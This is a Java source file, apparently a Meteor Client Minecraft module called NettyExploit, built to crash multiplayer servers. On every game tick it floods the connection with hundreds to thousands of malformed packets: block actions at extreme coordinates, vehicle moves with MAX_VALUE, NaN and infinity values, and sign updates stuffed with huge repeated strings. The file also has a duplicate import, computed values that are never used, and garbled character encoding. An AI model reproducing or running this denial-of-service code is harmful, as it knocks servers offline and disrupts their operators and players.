/*
 * This file is part of the Meteor Client distribution (https://github.com/MeteorDevelopment/meteor-client).
 * Copyright (c) Meteor Development.
 */

package meteordevelopment.meteorclient.systems.modules.exploit;

import io.netty.channel.Channel;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.mixin.ClientConnectionAccessor;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import java.util.Random;

import net.minecraft.util.math.Vec3d;

public class NettyExploit extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<ExploitMode> mode = sgGeneral.add(new EnumSetting.Builder<ExploitMode>()
        .name("exploit-mode")
        .description("The type of Netty exploit to perform.")
        .defaultValue(ExploitMode.PositionOverflow)
        .build()
    );

    private final Setting<Integer> intensity = sgGeneral.add(new IntSetting.Builder()
        .name("intensity")
        .description("How intense the exploit should be.")
        .defaultValue(500)
        .min(1)
        .sliderRange(1, 2000)
        .build()
    );

    private final Setting<Boolean> extremeValues = sgGeneral.add(new BoolSetting.Builder()
        .name("extreme-values")
        .description("Use extreme coordinate values that might cause integer overflow.")
        .defaultValue(true)
        .build()
    );

    private final Random random = new Random();

    public NettyExploit() {
        super(Categories.Exploit, "netty-exploit", "Advanced Netty exploits to crash servers through buffer/memory attacks.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.getNetworkHandler() == null) return;

        Channel channel = ((ClientConnectionAccessor) mc.player.networkHandler.getConnection()).meteor$getChannel();

        switch (mode.get()) {
            case PositionOverflow -> positionOverflow(channel);
            case VehicleSpam -> vehicleSpam(channel);
            case SignExploit -> signExploit(channel);
        }
    }

    private void positionOverflow(Channel channel) {
        try {
            for (int i = 0; i < intensity.get(); i++) {
                double x, y, z;

                if (extremeValues.get()) {
                    // Use values that might cause overflow or precision issues
                    x = random.nextBoolean() ? Double.MAX_VALUE : Double.MIN_VALUE;
                    y = random.nextBoolean() ? Double.MAX_VALUE : Double.MIN_VALUE;
                    z = random.nextBoolean() ? Double.MAX_VALUE : Double.MIN_VALUE;

                    // Sometimes use NaN or Infinity
                    if (random.nextFloat() < 0.1f) x = Double.NaN;
                    if (random.nextFloat() < 0.1f) y = Double.POSITIVE_INFINITY;
                    if (random.nextFloat() < 0.1f) z = Double.NEGATIVE_INFINITY;
                } else {
                    // Use large but potentially valid coordinates
                    x = random.nextDouble() * 30000000;
                    y = random.nextDouble() * 256;
                    z = random.nextDouble() * 30000000;
                }

                float yaw = extremeValues.get() ? Float.MAX_VALUE : random.nextFloat() * 360;
                float pitch = extremeValues.get() ? Float.MIN_VALUE : random.nextFloat() * 180 - 90;

                // Use PlayerActionC2SPacket with extreme positions instead
                BlockPos pos = new BlockPos(
                    (int) Math.max(Integer.MIN_VALUE, Math.min(Integer.MAX_VALUE, x)),
                    (int) Math.max(0, Math.min(319, y)),
                    (int) Math.max(Integer.MIN_VALUE, Math.min(Integer.MAX_VALUE, z))
                );

                PlayerActionC2SPacket packet = new PlayerActionC2SPacket(
                    PlayerActionC2SPacket.Action.START_DESTROY_BLOCK, pos, Direction.UP
                );

                channel.write(packet);
            }
            channel.flush();
        } catch (Exception e) {
            // Continue on errors
        }
    }

    private void vehicleSpam(Channel channel) {
        try {
            for (int i = 0; i < intensity.get(); i++) {
                double x, y, z;

                if (extremeValues.get()) {
                    x = Double.MAX_VALUE;
                    y = Double.MAX_VALUE;
                    z = Double.MAX_VALUE;
                } else {
                    x = random.nextDouble() * 1000000;
                    y = random.nextDouble() * 1000000;
                    z = random.nextDouble() * 1000000;
                }

                float yaw = extremeValues.get() ? Float.POSITIVE_INFINITY : random.nextFloat() * 360;
                float pitch = extremeValues.get() ? Float.NEGATIVE_INFINITY : random.nextFloat() * 180;

                VehicleMoveC2SPacket packet = new VehicleMoveC2SPacket(
                    new Vec3d(x, y, z), yaw, pitch, random.nextBoolean()
                );
                channel.write(packet);
            }
            channel.flush();
        } catch (Exception e) {
            // Continue on errors
        }
    }

    private void signExploit(Channel channel) {
        try {
            for (int i = 0; i < intensity.get(); i++) {
                BlockPos pos = new BlockPos(
                    extremeValues.get() ? Integer.MAX_VALUE : random.nextInt(1000000),
                    extremeValues.get() ? Integer.MAX_VALUE : random.nextInt(256),
                    extremeValues.get() ? Integer.MAX_VALUE : random.nextInt(1000000)
                );

                String[] lines = new String[4];
                for (int j = 0; j < 4; j++) {
                    if (extremeValues.get()) {
                        // Create extremely long strings that might cause buffer overflow
                        StringBuilder sb = new StringBuilder();
                        for (int k = 0; k < 10000; k++) {
                            sb.append("ยง").append(random.nextInt(16)).append("MeteorCrash");
                        }
                        lines[j] = sb.toString();
                    } else {
                        lines[j] = "Meteor" + random.nextInt();
                    }
                }

                UpdateSignC2SPacket packet = new UpdateSignC2SPacket(pos, true, lines[0], lines[1], lines[2], lines[3]);
                channel.write(packet);
            }
            channel.flush();
        } catch (Exception e) {
            // Continue on errors
        }
    }

    public enum ExploitMode {
        PositionOverflow("Position Overflow"),
        VehicleSpam("Vehicle Spam"),
        SignExploit("Sign Exploit");

        private final String title;

        ExploitMode(String title) {
            this.title = title;
        }

        @Override
        public String toString() {
            return title;
        }
    }
}
